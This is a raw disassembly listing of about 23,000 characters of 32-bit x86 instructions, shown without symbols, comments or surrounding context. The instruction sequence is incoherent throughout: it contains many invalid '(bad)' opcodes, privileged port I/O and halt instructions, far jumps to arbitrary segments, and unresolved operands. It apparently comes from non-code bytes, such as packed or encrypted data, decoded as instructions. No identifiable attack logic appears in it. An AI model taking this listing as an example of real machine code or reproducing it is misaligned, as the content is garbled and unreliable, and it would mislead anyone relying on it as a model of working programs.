  418b25:	out    0x5a,eax
  418b27:	inc    ebp
  418b28:	rol    BYTE PTR [ebx],cl
  418b2a:	movhps xmm6,QWORD PTR [eax]
  418b2d:	mov    eax,ds:0xf9e897f9
  418b32:	je     0x418b93
  418b34:	call   0xfce3ef9b
  418b39:	dec    ebp
  418b3a:	jle    0x418b23
  418b3c:	into   
  418b3d:	push   edx
  418b3e:	sbb    DWORD PTR [ebx+0x4c80080a],ebp
  418b44:	adc    DWORD PTR [ebx-0x24],edx
  418b47:	fsub   QWORD PTR [edi]
  418b49:	xchg   edx,eax
  418b4a:	jns    0x418b3b
  418b4c:	(bad)  
  418b4d:	lock js 0x418b95
  418b50:	jg     0x418b8b
  418b52:	and    eax,0x201a2832
  418b57:	add    DWORD PTR [edx+ecx*1],ebp
  418b5a:	add    dl,BYTE PTR [edi-0x2d]
  418b5d:	das    
  418b5e:	or     dh,BYTE PTR ds:0xaf9806b5
  418b64:	outs   dx,BYTE PTR ds:[esi]
  418b65:	pop    edx
  418b66:	fmul   QWORD PTR [ebp-0x53]
  418b69:	stc    
  418b6a:	ja     0x418b0a
  418b6c:	push   ss
  418b6d:	hlt    
  418b6e:	shr    BYTE PTR [eax-0x16],cl
  418b71:	mov    cl,0x83
  418b73:	int3   
  418b74:	outs   dx,BYTE PTR ds:[esi]
  418b75:	(bad)  
  418b76:	lock fistp DWORD PTR [edi+esi*2-0x6daf35ad]
  418b7e:	jg     0x418b00
  418b80:	sbb    BYTE PTR [ebp-0x6667501],dh
  418b86:	push   esi
  418b87:	repnz mov eax,ds:0x4386ffb5
  418b8d:	inc    ebx
  418b8e:	adc    edi,DWORD PTR [ebp-0xdcb2589]
  418b94:	sub    bh,dl
  418b96:	jb     0x418c09
  418b98:	call   0x478b:0x6865d38b
  418b9f:	inc    ebp
  418ba0:	pop    ss
  418ba1:	test   eax,0x2750ac3e
  418ba6:	retf   0x11a7
  418ba9:	mov    edi,esp
  418bab:	push   cs
  418bac:	xor    esp,esi
  418bae:	and    eax,0x879cfc75
  418bb3:	arpl   WORD PTR ds:0x5d83363b,cx
  418bb9:	adc    al,0x1
  418bbb:	jmp    0xfce0:0xd2338112
  418bc2:	repnz add BYTE PTR [edx-0x7d],dh
  418bc6:	dec    edx
  418bc7:	out    0xea,al
  418bc9:	icebp  
  418bca:	fidivr DWORD PTR [ebx-0x1c0a2235]
  418bd0:	(bad)  
  418bd1:	and    al,0x89
  418bd3:	mov    WORD PTR [esi-0xc],cs
  418bd6:	adc    eax,DWORD PTR [edx]
  418bd8:	jns    0x418c0d
  418bda:	test   DWORD PTR [ebx+0x2ab01d75],ecx
  418be0:	std    
  418be1:	out    dx,eax
  418be2:	iret   
  418be3:	jmp    0x2000:0xb5e356a3
  418bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418beb:	inc    ebp
  418bed:	xchg   edx,eax
  418bee:	xor    eax,0xb4d853a3
  418bf3:	lds    ecx,FWORD PTR [ebp-0x5a97a7d7]
  418bf9:	scas   eax,DWORD PTR es:[edi]
  418bfa:	data16 aaa 
  418bfc:	js     0x418bb4
  418bfe:	fs push edx
  418c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c01:	mov    ?,esi
  418c03:	push   ss
  418c04:	out    dx,eax
  418c05:	loopne 0x418c1f
  418c07:	jns    0x418c48
  418c09:	js     0x418c87
  418c0b:	loop   0x418c08
  418c0d:	pushf  
  418c0e:	repnz xor al,0xd3
  418c11:	dec    esi
  418c12:	sub    al,0xd8
  418c14:	jns    0x418c75
  418c16:	mov    al,ds:0x1ef21068
  418c1b:	popf   
  418c1c:	mov    eax,0x94dcdcd2
  418c21:	sub    ebp,DWORD PTR [esi+0x56add03e]
  418c27:	rcr    DWORD PTR [edx+0x31],cl
  418c2a:	aaa    
  418c2b:	sub    eax,0xfd2c78b4
  418c30:	xchg   ebx,eax
  418c31:	adc    edx,DWORD PTR [esi+0x74]
  418c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c35:	out    dx,eax
  418c36:	loopne 0x418c75
  418c38:	stos   DWORD PTR es:[edi],eax
  418c39:	sbb    DWORD PTR [edi-0x43],0xb3f8d8cf
  418c40:	add    dl,BYTE PTR [ebp-0x6fcd5abd]
  418c46:	cmc    
  418c47:	dec    edx
  418c48:	mov    esi,DWORD PTR [ecx]
  418c4a:	iret   
  418c4b:	mov    dh,0xbe
  418c4d:	xor    cl,0x7b
  418c50:	ror    DWORD PTR [edi+0x5e3b3830],1
  418c56:	xor    DWORD PTR [ebp+0x5d],ebx
  418c59:	push   ss
  418c5a:	xchg   edi,eax
  418c5b:	push   ebp
  418c5c:	mov    esp,0x3f7dc7f8
  418c61:	push   ebp
  418c62:	cwde   
  418c63:	jns    0x418cc8
  418c65:	push   cs
  418c66:	pop    edi
  418c67:	addr16 cwde 
  418c69:	inc    esp
  418c6a:	dec    edi
  418c6b:	pop    edi
  418c6c:	ja     0x418c31
  418c6e:	mov    ds:0xc222fdb7,eax
  418c73:	lock cmp al,0x36
  418c76:	aaa    
  418c77:	adc    eax,0x25a47520
  418c7c:	push   ebx
  418c7d:	ins    BYTE PTR es:[edi],dx
  418c7e:	cmp    al,0x86
  418c80:	repz or ebx,DWORD PTR [eax+0x2cfae72]
  418c87:	inc    eax
  418c88:	pop    eax
  418c89:	mov    ebx,0x2eab3e55
  418c8e:	add    eax,0x4c28929a
  418c93:	dec    eax
  418c94:	push   esp
  418c95:	outs   dx,BYTE PTR ds:[esi]
  418c96:	outs   dx,DWORD PTR ds:[esi]
  418c97:	or     BYTE PTR [edx-0x2f8a02b7],bh
  418c9d:	dec    ebp
  418c9e:	ds pop ecx
  418ca0:	out    dx,al
  418ca1:	outs   dx,DWORD PTR ds:[esi]
  418ca2:	pop    es
  418ca3:	aas    
  418ca4:	sbb    esi,edx
  418ca6:	push   ecx
  418ca7:	and    BYTE PTR [eax],ch
  418ca9:	inc    ebp
  418caa:	repnz (bad) 
  418cac:	mov    eax,ds:0x4a9be41f
  418cb1:	xlat   BYTE PTR ds:[ebx]
  418cb2:	popa   
  418cb3:	mov    al,ds:0xa6843006
  418cb8:	ret    0xcc2f
  418cbb:	mov    eax,0x4370542a
  418cc0:	loop   0x418c50
  418cc2:	pop    ebp
  418cc3:	shr    BYTE PTR [edi+edx*1-0x6a],0x79
  418cc8:	fild   DWORD PTR [edx-0x37b88b09]
  418cce:	add    bl,BYTE PTR [ebp+0x52f649d2]
  418cd4:	aam    0x7d
  418cd6:	and    BYTE PTR [eax],0x94
  418cd9:	xor    DWORD PTR [edx],ebx
  418cdb:	and    dh,BYTE PTR [edi+eax*1]
  418cde:	enter  0xfec3,0xd9
  418ce2:	dec    ebx
  418ce3:	aad    0x48
  418ce5:	jns    0x418c67
  418ce7:	fiadd  WORD PTR [ebx+0x58ff3b03]
  418ced:	jne    0x418d0c
  418cef:	mov    ds:0xc1f999a,eax
  418cf4:	mov    BYTE PTR [edx+ebp*2+0x4b],ch
  418cf8:	sbb    BYTE PTR [esi-0x47],cl
  418cfb:	loope  0x418d70
  418cfd:	mov    BYTE PTR [edx],bh
  418cff:	ss jbe 0x418d62
  418d02:	pop    es
  418d03:	(bad)  
  418d04:	shl    esi,1
  418d06:	inc    esi
  418d07:	loopne 0x418caa
  418d09:	test   DWORD PTR [edx+0x2a72bbbd],ebx
  418d0f:	jnp    0x418cb2
  418d11:	imul   eax,DWORD PTR [ebp-0x20],0xffffff83
  418d15:	fimul  WORD PTR [edi+0x33]
  418d18:	jne    0x418cb5
  418d1a:	arpl   WORD PTR [edi+0x5c],cx
  418d1d:	push   ebp
  418d1e:	loop   0x418d8e
  418d20:	fcmove st,st(1)
  418d22:	pop    esp
  418d23:	xor    BYTE PTR [ebp+0x3ae0e319],0x79
  418d2a:	popa   
  418d2b:	inc    eax
  418d2c:	gs mov eax,0xd200a481
  418d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d33:	pusha  
  418d34:	les    ecx,FWORD PTR [ecx-0x6fb8149]
  418d3a:	mov    ds:0x54261234,eax
  418d3f:	xchg   DWORD PTR [ebp-0x21],esp
  418d42:	int3   
  418d43:	and    DWORD PTR [bp-0x1b8f],esi
  418d48:	pop    esi
  418d49:	aaa    
  418d4a:	loop   0x418d9b
  418d4c:	mov    bl,0x4c
  418d4e:	sahf   
  418d4f:	push   0xdbd4e9cc
  418d54:	adc    BYTE PTR [ebx+edi*1],ah
  418d57:	cmp    DWORD PTR [ebx],edi
  418d59:	dec    esp
  418d5a:	and    DWORD PTR [edx+edi*8-0x5e761535],esi
  418d61:	mul    DWORD PTR [edi]
  418d63:	or     eax,0x8777fbb3
  418d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d69:	xchg   DWORD PTR [esi],eax
  418d6b:	(bad)  
  418d6c:	lods   al,BYTE PTR ds:[esi]
  418d6d:	xchg   esp,eax
  418d6e:	ja     0x418d1d
  418d70:	fiadd  WORD PTR [esi-0x4cae585a]
  418d76:	cmp    BYTE PTR [ebp-0x18],cl
  418d79:	inc    esp
  418d7a:	mov    dl,0x74
  418d7c:	shl    DWORD PTR [esi+ecx*8-0x49],0x43
  418d81:	add    eax,0xd31bf57e
  418d86:	out    0xfa,al
  418d88:	popf   
  418d89:	inc    eax
  418d8a:	mov    edi,0x90c11237
  418d8f:	(bad)  
  418d90:	cld    
  418d91:	fcmovb st,st(7)
  418d93:	lds    esi,FWORD PTR [ecx+ebx*2]
  418d96:	jns    0x418e17
  418d98:	xor    al,0x63
  418d9a:	sbb    al,0x77
  418d9c:	daa    
  418d9d:	add    edi,edx
  418d9f:	loop   0x418df3
  418da1:	inc    esp
  418da2:	add    al,0xf2
  418da4:	ins    BYTE PTR es:[edi],dx
  418da5:	lea    edi,[edi+0xb01e2b3]
  418dab:	jmp    0x418e10
  418dad:	push   0xffffffc3
  418daf:	sti    
  418db0:	rcl    DWORD PTR [ebx+0xa6fdb85],cl
  418db6:	mov    edi,0x695b834a
  418dbb:	sbb    eax,0xdf7e00b1
  418dc0:	jl     0x418dca
  418dc2:	lds    edi,FWORD PTR [edx]
  418dc4:	popf   
  418dc5:	gs out dx,eax
  418dc7:	mov    cl,0x14
  418dc9:	and    al,0x96
  418dcb:	xor    eax,DWORD PTR [ebp-0x36729184]
  418dd1:	stos   DWORD PTR es:[edi],eax
  418dd2:	push   ecx
  418dd3:	jno    0x418e0e
  418dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dd6:	jge    0x418e3e
  418dd8:	repnz sbb DWORD PTR [edi-0x4d],esi
  418ddc:	push   0xa8dc36fb
  418de1:	cmp    eax,0x8021b0b2
  418de6:	jns    0x418e34
  418de8:	test   BYTE PTR [ebx],0xd
  418deb:	rcr    dl,1
  418ded:	sbb    cl,BYTE PTR [edx+0x2e7e66fd]
  418df3:	ffree  st(7)
  418df5:	enter  0xc577,0xfd
  418df9:	inc    ebx
  418dfa:	mov    ebx,0xadd79e99
  418dff:	inc    ebx
  418e00:	mov    edx,0xf8036669
  418e05:	push   edi
  418e06:	mov    WORD PTR [eax+0x76],?
  418e09:	popa   
  418e0a:	out    0x82,al
  418e0c:	out    0xee,al
  418e0e:	imul   eax,DWORD PTR [eax+edi*1],0xde331662
  418e15:	mov    esi,0xf9f76a82
  418e1a:	mov    edx,0x9136edb7
  418e1f:	cld    
  418e20:	repnz or al,0x58
  418e23:	sub    eax,0x7fef3106
  418e28:	or     BYTE PTR [edi+0x5e563973],0xc9
  418e2f:	std    
  418e30:	inc    esp
  418e31:	cs popa 
  418e33:	jo     0x418df6
  418e35:	fsubp  st(6),st
  418e37:	lods   eax,DWORD PTR ds:[esi]
  418e38:	mov    eax,0x36a7d930
  418e3d:	xor    al,0x94
  418e3f:	imul   edi,edx,0x28
  418e42:	into   
  418e43:	(bad)  
  418e44:	mov    eax,ds:0x81770b2e
  418e49:	loope  0x418ea5
  418e4b:	loope  0x418e26
  418e4d:	ficom  DWORD PTR [edx-0x42]
  418e50:	xchg   edi,eax
  418e51:	add    DWORD PTR [edi+0x1d],eax
  418e54:	jnp    0x418e2c
  418e56:	push   ebp
  418e57:	in     eax,0x45
  418e59:	(bad)  
  418e5a:	in     eax,dx
  418e5b:	mov    al,ds:0x14d9739c
  418e60:	out    dx,eax
  418e61:	xchg   DWORD PTR [edx-0x16aebe3a],edi
  418e67:	and    DWORD PTR [esp+ecx*8],0xf9bda9a0
  418e6e:	ret    0xda43
  418e71:	xchg   esi,eax
  418e72:	inc    edx
  418e73:	call   0xbe6c:0x43b12d03
  418e7a:	imul   DWORD PTR [ecx+0x205f4862]
  418e80:	int    0xe2
  418e82:	inc    ebp
  418e83:	fnsave [ecx-0x8fba930]
  418e89:	call   0x86cd:0xa36e5156
  418e90:	retf   
  418e91:	jl     0x418ebb
  418e93:	je     0x418ead
  418e95:	loopne 0x418ee5
  418e97:	jg     0x418e8b
  418e99:	lods   eax,DWORD PTR ds:[esi]
  418e9a:	push   cs
  418e9b:	pop    esp
  418e9c:	ins    BYTE PTR es:[edi],dx
  418e9d:	icebp  
  418e9e:	dec    edx
  418e9f:	inc    ecx
  418ea0:	shl    DWORD PTR [ebx],cl
  418ea2:	test   al,0x9b
  418ea4:	adc    al,0x3e
  418ea6:	popa   
  418ea7:	cmp    eax,DWORD PTR [ecx-0x1872b999]
  418ead:	inc    edx
  418eae:	jae    0x418eed
  418eb0:	inc    esi
  418eb1:	mov    ah,0x4e
  418eb3:	(bad)  
  418eb4:	iret   
  418eb5:	adc    eax,0xf9afd710
  418eba:	nop
  418ebb:	aad    0xb4
  418ebd:	(bad)  
  418ebe:	mov    ah,0x46
  418ec0:	cwde   
  418ec1:	cli    
  418ec2:	xchg   BYTE PTR [ebx-0x1],ah
  418ec5:	rol    BYTE PTR [ecx],0x5a
  418ec8:	or     bl,BYTE PTR [ebx+0x40a111c4]
  418ece:	xor    BYTE PTR [ecx+0x4eaf22bb],dh
  418ed4:	sbb    al,0x2f
  418ed6:	inc    edi
  418ed7:	outs   dx,DWORD PTR ds:[esi]
  418ed8:	scas   al,BYTE PTR es:[edi]
  418ed9:	out    0xe6,al
  418edb:	pop    edi
  418edc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418edd:	lds    edi,FWORD PTR [ecx]
  418edf:	mov    ebp,0x8200ce2a
  418ee4:	pop    ss
  418ee5:	dec    esi
  418ee6:	xchg   esp,eax
  418ee7:	push   ds
  418ee8:	mov    edx,0x49ae3ec
  418eed:	adc    DWORD PTR [esi+0x37d255c0],edi
  418ef3:	sti    
  418ef4:	gs fwait
  418ef6:	test   al,0x51
  418ef9:	sbb    eax,0x9a0838a5
  418efe:	xchg   ebx,eax
  418eff:	mov    al,0x2f
  418f01:	ins    BYTE PTR es:[edi],dx
  418f02:	inc    eax
  418f03:	or     al,0x4d
  418f05:	cs jg  0x418f1b
  418f08:	imul   edx,DWORD PTR [ebx],0x2b4e0a31
  418f0e:	and    ebp,DWORD PTR [esi-0x6105551e]
  418f14:	and    eax,0x81643877
  418f19:	mov    edx,0xb03100b7
  418f1e:	xor    cl,ch
  418f20:	gs call 0x7bf0:0xae1dc918
  418f28:	ss loopne 0x418f04
  418f2b:	pop    esp
  418f2c:	jbe    0x418f2e
  418f2e:	fsubr  st(7),st
  418f30:	pop    eax
  418f31:	(bad)  
  418f32:	pop    ds
  418f33:	pop    edx
  418f34:	push   ecx
  418f35:	ret    0xfb00
  418f38:	fist   WORD PTR [edi+0x5754db99]
  418f3e:	xor    eax,0x1d107898
  418f43:	popa   
  418f44:	pusha  
  418f45:	inc    esp
  418f46:	push   0x7a
  418f48:	in     eax,dx
  418f49:	push   ebp
  418f4a:	fstp   QWORD PTR [ecx+0x62]
  418f4d:	aam    0x2f
  418f4f:	in     al,dx
  418f50:	mov    ch,0x74
  418f52:	pop    ds
  418f53:	clc    
  418f54:	mov    WORD PTR [esp+ecx*8],ss
  418f57:	aaa    
  418f58:	adc    DWORD PTR [eax-0x616fbca1],ebp
  418f5e:	out    dx,al
  418f5f:	stc    
  418f60:	jae    0x418f27
  418f62:	imul   edi,DWORD PTR [ebx+ecx*8-0x53e4b580],0xb6e67975
  418f6d:	imul   ecx,DWORD PTR [ecx-0x35],0x39911ca5
  418f74:	imul   esp,DWORD PTR ds:0xf130b124,0xd77f0c22
  418f7e:	push   0xffffffc4
  418f80:	push   ds
  418f81:	outs   dx,BYTE PTR ds:[esi]
  418f82:	push   ds
  418f83:	rcr    BYTE PTR [ebp-0x13fabea6],cl
  418f89:	jno    0x418fb9
  418f8b:	stc    
  418f8c:	sub    edx,0xffffff85
  418f8f:	(bad)  
  418f91:	jae    0x418f40
  418f93:	xor    BYTE PTR [ecx+eax*8+0x20],ch
  418f97:	leave  
  418f98:	adc    eax,0xb21f689
  418f9d:	xchg   DWORD PTR [ecx],esp
  418f9f:	inc    ebx
  418fa0:	mov    ecx,0x2aed30a
  418fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fa6:	add    eax,0x46a07653
  418fab:	lahf   
  418fac:	test   eax,0xb5695e38
  418fb1:	pop    esp
  418fb2:	jmp    0x1bae:0x9c8389a6
  418fb9:	jle    0x41900a
  418fbb:	pop    esi
  418fbc:	(bad)  
  418fbd:	and    BYTE PTR [esi-0xddba0ef],al
  418fc3:	sbb    eax,0x4c54a5b2
  418fc8:	lock cmp edx,DWORD PTR [edx-0x7b]
  418fcc:	mov    ah,al
  418fce:	lds    eax,FWORD PTR [eax]
  418fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fd1:	push   ebp
  418fd2:	(bad)
  418fd5:	push   eax
  418fd6:	jmp    0x27398456
  418fdb:	lds    ebx,FWORD PTR [ecx]
  418fdd:	test   eax,0x3538986d
  418fe2:	dec    eax
  418fe3:	mov    al,0x40
  418fe5:	push   esp
  418fe6:	sahf   
  418fe7:	mov    edx,0x382f121d
  418fec:	xor    esp,eax
  418fee:	and    eax,0x16753a0e
  418ff3:	icebp  
  418ff4:	adc    al,0x15
  418ff6:	pop    ecx
  418ff7:	or     al,0x21
  418ff9:	mov    edx,0xf0be770f
  418ffe:	add    BYTE PTR [ecx],0xd3
  419001:	imul   edx,esi,0x67cb5ca9
  419007:	cmp    al,0x7
  419009:	fisubr DWORD PTR [edi+0x7c62e086]
  41900f:	stos   DWORD PTR es:[edi],eax
  419010:	fnstenv [esi+0x13f3cbce]
  419016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419017:	add    DWORD PTR [esi-0x21910986],ecx
  41901d:	dec    eax
  41901e:	xor    DWORD PTR [edx-0x4c],ebp
  419021:	xlat   BYTE PTR ds:[ebx]
  419022:	xor    al,0x0
  419024:	or     al,0xff
  419026:	adc    cl,BYTE PTR [edx+0x5f]
  419029:	adc    al,0x4e
  41902b:	sbb    esi,DWORD PTR [ecx+0x4b]
  41902e:	inc    edi
  41902f:	(bad)  [edx-0xde93b15]
  419035:	imul   eax,edi,0x75
  419038:	jg     0x419045
  41903a:	sar    esi,cl
  41903c:	nop
  41903d:	sbb    edi,eax
  41903f:	fldcw  WORD PTR ds:0xd6fb15da
  419045:	into   
  419046:	mov    al,0x12
  419048:	(bad)  
  41904a:	xchg   edi,eax
  41904b:	sbb    DWORD PTR [ebx+0x22e74e97],ebx
  419051:	xor    ch,BYTE PTR [ecx-0x41]
  419054:	mov    al,ds:0x9fff0f7c
  419059:	std    
  41905a:	fsubr  DWORD PTR [ebx]
  41905c:	xchg   esi,eax
  41905d:	mov    ah,0x82
  41905f:	adc    edi,DWORD PTR [edi]
  419061:	aad    0xee
  419063:	pop    ebp
  419064:	pop    ebx
  419065:	std    
  419066:	mov    ecx,0x3ad18cb3
  41906b:	not    DWORD PTR [ecx]
  41906d:	push   edi
  41906e:	or     ah,0x53
  419071:	push   esi
  419072:	sub    BYTE PTR [ebp+0xfbddb5c],ch
  419078:	xchg   esi,eax
  419079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41907a:	bound  ebp,QWORD PTR [ecx]
  41907c:	mov    ecx,0xa4c3602
  419081:	push   ds
  419082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419083:	repz jmp 0x419100
  419086:	ja     0x41906d
  419088:	lock aas 
  41908a:	leave  
  41908b:	mov    ds:0x1f40b626,al
  419090:	mov    esi,0xa289fbb8
  419095:	adc    ah,bl
  419097:	or     DWORD PTR [edi],edi
  419099:	mov    cs,WORD PTR [esi+0x4]
  41909c:	out    dx,eax
  41909d:	je     0x419118
  41909f:	xor    edi,DWORD PTR [eax]
  4190a1:	lds    esi,FWORD PTR [esi-0x40]
  4190a4:	push   edx
  4190a5:	mov    edi,0xa93e72ea
  4190aa:	(bad)  
  4190ab:	mov    eax,eax
  4190ad:	clc    
  4190ae:	rol    BYTE PTR [ecx+0x7e99d525],1
  4190b4:	dec    eax
  4190b5:	push   ss
  4190b6:	imul   esi,ebx,0xffffffc5
  4190b9:	std    
  4190ba:	xchg   ebp,eax
  4190bb:	call   0x2f6d:0xc82c3f5
  4190c2:	test   DWORD PTR [ecx],0x832d8316
  4190c8:	or     cl,BYTE PTR [ecx]
  4190ca:	add    BYTE PTR [eax],dl
  4190cc:	ja     0x4190e6
  4190ce:	jg     0x4190f2
  4190d0:	rcl    BYTE PTR [ecx],1
  4190d2:	sub    eax,0x79f10c5e
  4190d7:	ja     0x419156
  4190d9:	sbb    DWORD PTR [ebp-0x10],ecx
  4190dc:	leave  
  4190dd:	pop    ss
  4190de:	inc    ebp
  4190df:	or     al,0x7
  4190e1:	push   0x7efcb533
  4190e6:	push   cs
  4190e7:	pop    ebp
  4190e8:	or     eax,0x23e9ca71
  4190ed:	call   0x15b0:0x4b483698
  4190f4:	add    BYTE PTR [ebp+ecx*4-0x27],ch
  4190f8:	and    eax,DWORD PTR [eax+0x63]
  4190fb:	ds dec esi
  4190fd:	sbb    esi,esp
  4190ff:	mov    esp,0x6a38bd1e
  419104:	mov    WORD PTR [ebx-0x104e98d6],ss
  41910a:	inc    ebx
  41910b:	jnp    0x41910b
  41910d:	add    ah,BYTE PTR [ebx+0x54]
  419110:	fldenv [esi]
  419112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419113:	push   ecx
  419114:	cmp    BYTE PTR [ebx+0x67],al
  419117:	push   0xffffff8c
  419119:	or     al,0x6d
  41911b:	mov    ds:0x98a6d5b4,al
  419120:	loope  0x4190b7
  419122:	mov    ebx,0x4bacbe5e
  419127:	jl     0x419105
  419129:	xchg   esi,eax
  41912a:	sbb    edi,DWORD PTR [edi+0x54]
  41912d:	push   eax
  41912e:	and    DWORD PTR [ecx+0x735acf5d],esp
  419134:	mov    ebp,0xb9363082
  419139:	scas   eax,DWORD PTR es:[edi]
  41913a:	mov    bh,0xc3
  41913c:	push   edi
  41913d:	cmp    eax,0xc02e41ae
  419142:	xor    eax,DWORD PTR [ecx-0x7a35cd36]
  419148:	aam    0x10
  41914a:	fmul   DWORD PTR [ecx-0x2a99c935]
  419150:	mov    eax,0x33227cc
  419155:	jo     0x419150
  419157:	mov    al,0x2f
  419159:	(bad)  
  41915a:	stc    
  41915b:	shr    BYTE PTR fs:[ebx-0x575dff8],cl
  419162:	add    bl,bh
  419164:	clc    
  419165:	mov    dl,0xac
  419167:	pop    ebp
  419168:	push   esi
  419169:	aam    0xfb
  41916b:	std    
  41916c:	mov    ebp,?
  41916e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41916f:	loop   0x4191b5
  419171:	push   ds
  419172:	stos   DWORD PTR es:[edi],eax
  419173:	add    cl,BYTE PTR [edi-0x5d9b2bf5]
  419179:	xchg   BYTE PTR [ecx-0x296513e9],cl
  41917f:	cmp    ebp,DWORD PTR [eax+esi*4+0x5544cc2e]
  419186:	call   0xf89bd069
  41918b:	outs   dx,BYTE PTR ds:[esi]
  41918c:	sub    eax,0xd280ead4
  419191:	dec    esi
  419192:	into   
  419193:	mov    dh,0x4b
  419195:	dec    edi
  419196:	dec    ebp
  419197:	enter  0xaeb2,0x98
  41919b:	pop    ss
  41919c:	xchg   esi,eax
  41919d:	popf   
  41919e:	mov    ch,0x4f
  4191a0:	fs fwait
  4191a2:	pop    esp
  4191a3:	inc    eax
  4191a4:	jo     0x41913e
  4191a6:	cs clc 
  4191a8:	or     esp,0x99e05670
  4191ae:	mov    dh,0xb3
  4191b0:	mov    al,0x15
  4191b2:	mov    ?,ebp
  4191b4:	(bad)  
  4191b5:	cmp    esp,DWORD PTR [ebp+ecx*8-0x77a294a0]
  4191bc:	push   ecx
  4191bd:	gs mov ch,0x9
  4191c0:	xchg   edi,eax
  4191c1:	loopne 0x419162
  4191c3:	add    bh,BYTE PTR [edx]
  4191c5:	and    eax,0xfd65cda0
  4191ca:	cwde   
  4191cb:	push   ecx
  4191cc:	push   edx
  4191cd:	nop
  4191ce:	test   DWORD PTR es:[eax+0x5b659641],ecx
  4191d5:	iret   
  4191d6:	aam    0x21
  4191d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191d9:	dec    esi
  4191da:	fwait
  4191db:	adc    al,BYTE PTR [ecx]
  4191dd:	mov    cs,WORD PTR [edi+0x4a]
  4191e0:	mov    ds:0x3181d65a,al
  4191e5:	aam    0xdc
  4191e7:	into   
  4191e8:	dec    ebp
  4191e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191ea:	mov    cl,BYTE PTR [eax+esi*1-0x29]
  4191ee:	leave  
  4191ef:	cli    
  4191f0:	push   0x11252fe6
  4191f5:	sub    DWORD PTR [ecx-0x2],0x5dd1f825
  4191fc:	icebp  
  4191fd:	xchg   ebp,eax
  4191fe:	(bad)  
  4191ff:	jge    0x4191f3
  419201:	js     0x4191ad
  419203:	and    eax,0x2083de6c
  419208:	shl    DWORD PTR [ebp+0x1829653f],0xfa
  41920f:	xchg   esi,eax
  419210:	mov    dl,BYTE PTR [ecx-0x3f]
  419213:	mov    eax,0xdf74b8b2
  419218:	adc    BYTE PTR [edx+0x1b79b50c],0x83
  41921f:	ror    DWORD PTR [ebx+0x156627d9],0x1a
  419226:	sti    
  419227:	mov    eax,0x3cd0be86
  41922c:	pop    edi
  41922d:	cmp    DWORD PTR [edx+ebp*8-0x40],edx
  419231:	xchg   ebx,eax
  419232:	sub    eax,0x622a584
  419237:	xor    esi,DWORD PTR [esi]
  419239:	ds in  eax,0xa5
  41923c:	leave  
  41923d:	aas    
  41923e:	jmp    0x2e20:0x524867c2
  419245:	or     bh,bl
  419247:	outs   dx,BYTE PTR ds:[esi]
  419248:	xchg   ebp,eax
  419249:	push   ds
  41924a:	outs   dx,BYTE PTR ds:[esi]
  41924b:	xchg   ebx,eax
  41924c:	push   0x8d66be25
  419251:	lahf   
  419252:	jmp    0xa4725c90
  419257:	pop    ds
  419258:	imul   esi,DWORD PTR [edi+0x2a],0x5408a01f
  41925f:	fcmovne st,st(3)
  419261:	and    bl,ah
  419263:	add    BYTE PTR ds:0x162d0837,0x2c
  41926a:	call   0x83f8790b
  41926f:	out    dx,eax
  419270:	jae    0x419280
  419272:	add    eax,0x8574e50
  419277:	pop    ds
  419278:	int3   
  419279:	add    ch,BYTE PTR [edx+0x21370383]
  41927f:	mov    dh,0x6a
  419281:	loop   0x41929d
  419283:	add    eax,0x995d47e6
  419288:	pop    edi
  419289:	mov    dl,0x6f
  41928b:	jge    0x419270
  41928d:	cld    
  41928e:	xor    BYTE PTR [esi+0x11f2bfe9],bh
  419294:	inc    esi
  419295:	push   esi
  419296:	sub    DWORD PTR [edx-0x2a],eax
  419299:	dec    edx
  41929a:	sub    al,0xb6
  41929c:	aaa    
  41929d:	int3   
  41929e:	jnp    0x419220
  4192a0:	xchg   ecx,eax
  4192a1:	fst    DWORD PTR [ebp+edx*1+0x6b]
  4192a5:	sub    al,0x4c
  4192a7:	out    dx,al
  4192a8:	push   cs
  4192a9:	sub    eax,0x32f71212
  4192ae:	repz jmp 0x419286
  4192b1:	inc    esi
  4192b2:	pop    ss
  4192b3:	je     0x41923b
  4192b5:	dec    ebx
  4192b6:	in     al,dx
  4192b7:	dec    edx
  4192b8:	outs   dx,BYTE PTR ds:[esi]
  4192b9:	out    dx,eax
  4192ba:	pop    ds
  4192bb:	add    al,0x81
  4192bd:	sub    BYTE PTR [esi+0x2eff0a60],cl
  4192c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192c4:	call   FWORD PTR [ecx-0x6ccd0df3]
  4192ca:	or     DWORD PTR [edx+ecx*4-0x5280b72e],0xfe3346dc
  4192d5:	jecxz  0x41932d
  4192d7:	inc    edx
  4192d8:	out    dx,eax
  4192d9:	cld    
  4192da:	iret   
  4192db:	ins    BYTE PTR es:[edi],dx
  4192dc:	and    DWORD PTR [edx],ecx
  4192de:	sub    esi,DWORD PTR [edx]
  4192e0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4192e2:	mov    esi,0x6db3b8bf
  4192e7:	adc    eax,0xdc3138e8
  4192ec:	scas   eax,DWORD PTR es:[edi]
  4192ed:	pusha  
  4192ee:	in     al,dx
  4192ef:	retf   
  4192f0:	xor    BYTE PTR [ecx+0xd80400c],dh
  4192f6:	out    0xba,eax
  4192f8:	mov    edx,0xe204b6fd
  4192fd:	mov    eax,es
  4192ff:	push   0x3b
  419301:	mov    edx,0xcdf26ee4
  419306:	data16 repz sbb dl,ah
  41930a:	pusha  
  41930b:	cmp    al,0x94
  41930d:	xchg   edx,edi
  41930f:	pop    edx
  419310:	lods   al,BYTE PTR ds:[esi]
  419311:	cmp    esi,DWORD PTR [ebx+0x71]
  419314:	cmp    al,0x56
  419316:	mov    edx,0x55302163
